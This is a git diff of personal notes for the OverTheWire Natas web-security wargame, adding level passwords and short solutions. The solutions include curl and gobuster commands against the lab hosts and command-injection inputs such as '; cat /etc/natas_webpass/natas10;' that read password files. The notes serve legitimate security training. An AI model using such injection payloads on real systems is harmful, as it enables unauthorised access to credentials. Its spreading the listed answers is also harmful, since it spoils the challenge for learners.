@@ -5,19 +5,19 @@ URL:      http://natas0.natas.labs.overthewire.org
 
 All passwords are also stored: /etc/natas_webpass/natas5
 
-Level 0                g9D9cREhslqBKtcA2uocGHPfMZVzeFK6
-Level 0  --->  Level 1 h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7
-Level 1  --->  Level 2 G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q
-Level 2  --->  Level 3 tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm
-Level 3  --->  Level 4 Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD
-Level 4  --->  Level 5 fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR
-Level 5  --->  Level 6 jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr
-Level 6  --->  Level 7 
-Level 7  --->  Level 8
-Level 8  --->  Level 9
-Level 9  --->  Level 10
-Level 10 --->  Level 11
-Level 11 --->  Level 12
+Level 0                 g9D9cREhslqBKtcA2uocGHPfMZVzeFK6
+Level 0  --->  Level 1  h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7
+Level 1  --->  Level 2  G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q
+Level 2  --->  Level 3  tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm
+Level 3  --->  Level 4  Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD
+Level 4  --->  Level 5  fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR
+Level 5  --->  Level 6  jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr
+Level 6  --->  Level 7  a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB
+Level 7  --->  Level 8  Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd
+Level 8  --->  Level 9  D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE 
+Level 9  --->  Level 10 1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg
+Level 10 --->  Level 11 YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG
+Level 11 --->  Level 12 
 Level 12 --->  Level 13
 Level 13 --->  Level 14
 Level 14 --->  Level 15
@@ -42,6 +42,7 @@ Level 32 --->  Level 33
 Level 33 --->  Level 34
 
 
+OS Command Injection
 
 [Solutions]
 
@@ -51,3 +52,11 @@ curl --user "natas1:g9D9cREhslqBKtcA2uocGHPfMZVzeFK6" http://natas1.natas.labs.o
 Level 1 ---> Level 2:
 gobuster dir -u http://natas2.natas.labs.overthewire.org --username "natas2" --password "h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7" -w /usr/share/wordlists/dirb/common.txt
 
+
+
+
+Level 8  --->  Level 9:
+; cat /etc/natas_webpass/natas10;
+
+Level 9  --->  Level 10:
+$ /etc/natas_webpass/natas11
